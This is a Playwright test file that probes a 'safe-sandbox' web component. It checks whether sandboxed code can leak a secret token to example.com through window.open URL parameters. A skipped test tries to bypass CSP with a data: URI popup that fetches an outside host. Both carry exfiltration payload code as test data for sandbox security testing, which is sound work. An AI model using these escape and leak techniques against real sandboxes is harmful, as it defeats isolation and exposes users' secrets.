import { test, expect } from "@playwright/test";

test.describe("Popup Exfiltration", () => {
    test("should exfiltrate data via window.open URL parameters", async ({ page }) => {
        page.on('console', msg => console.log('PAGE LOG:', msg.text()));
        page.on('pageerror', err => console.log('PAGE ERROR:', err));

        await page.goto("/");

        // Wait for sandbox to be ready
        const iframeElement = page.locator("safe-sandbox iframe");
        await expect(iframeElement).toBeVisible();

        // Enable unsafe scripts to allow 'new Function' (execution mechanism)
        await page.evaluate(() => {
            const sandbox = document.querySelector("safe-sandbox");
            if (sandbox) sandbox.setAttribute("script-unsafe", "true");
        });

        // Allow some time for session initialization
        await page.waitForTimeout(2000);

        const secret = "SECRET_TOKEN_123";
        const code = `
            const secret = "${secret}";
            window.open("http://example.com/?leak=" + secret);
        `;

        // Listen for new pages (popups)
        const popupPromise = page.context().waitForEvent("page");

        // Execute code
        await page.evaluate((code) => {
            const sandbox = document.querySelector("safe-sandbox") as any;
            sandbox.execute(code);
        }, code);

        const popup = await popupPromise;
        await popup.waitForLoadState();

        const url = popup.url();
        console.log("Popup URL:", url);

        expect(url).toContain("example.com");
        expect(url).toContain(secret);
    });

    test.skip("should bypass CSP via data: URI popup", async ({ page }) => {
        // This test fails because modern browsers (Chrome) block data: URI navigation
        // from sandboxed iframes or treat it as about:blank.
        // This confirms that data: URI CSP bypass is mitigated by browser security features.

        page.on('console', msg => console.log('PAGE LOG:', msg.text()));
        page.on('pageerror', err => console.log('PAGE ERROR:', err));

        await page.goto("/");

        // Wait for sandbox to be ready
        const iframeElement = page.locator("safe-sandbox iframe");
        await expect(iframeElement).toBeVisible();

        // Enable unsafe scripts to allow 'new Function' (execution mechanism)
        await page.evaluate(() => {
            const sandbox = document.querySelector("safe-sandbox");
            if (sandbox) sandbox.setAttribute("script-unsafe", "true");
        });

        await page.waitForTimeout(2000);

        // We want to verify that the popup can make a fetch request to a domain NOT allowed by the sandbox.
        // The sandbox default allows NOTHING (except localhost if configured, but we assume strict default).
        // Host (playground) allows 'self' and sandbox.
        // We will try to fetch 'http://example.com'.

        const targetUrl = "http://example.com/data-uri-bypass";

        const code = `
            const html = \`
                <script>
                    fetch('${targetUrl}')
                        .then(() => console.log('Fetch success'))
                        .catch(e => console.error('Fetch failed', e));
                </script>
                <h1>Data URI Popup</h1>
            \`;
            try {
                const w = window.open("data:text/html," + encodeURIComponent(html));
                if (!w) console.error("window.open returned null");
                else {
                    console.log("window.open success");
                    setTimeout(() => {
                        console.log("Popup closed?", w.closed);
                        try {
                            console.log("Popup location:", w.location.href);
                        } catch(e) {
                            console.error("Popup location access failed:", e);
                        }
                    }, 1000);
                }
            } catch (e) {
                console.error("window.open failed: " + e);
            }
        `;

        // Monitor popup creation
        const popupPromise = page.waitForEvent("popup").catch(() => null);

        // Execute code
        await page.evaluate((code) => {
            const sandbox = document.querySelector("safe-sandbox") as any;
            sandbox.execute(code);
        }, code);

        const popup = await popupPromise;

        if (popup) {
            await popup.waitForLoadState();
            console.log("Popup URL:", popup.url());
            popup.on('console', msg => console.log('POPUP LOG:', msg.text()));
            popup.on('pageerror', err => console.log('POPUP ERROR:', err));
        } else {
            console.log("Popup did not open (or timeout).");
        }

        // Wait for script execution
        await page.waitForTimeout(3000);

        // If the fetch succeeded, we might see it in the context requests?
        // But verifying if CSP is bypassed is easier by checking logs.
    });
});
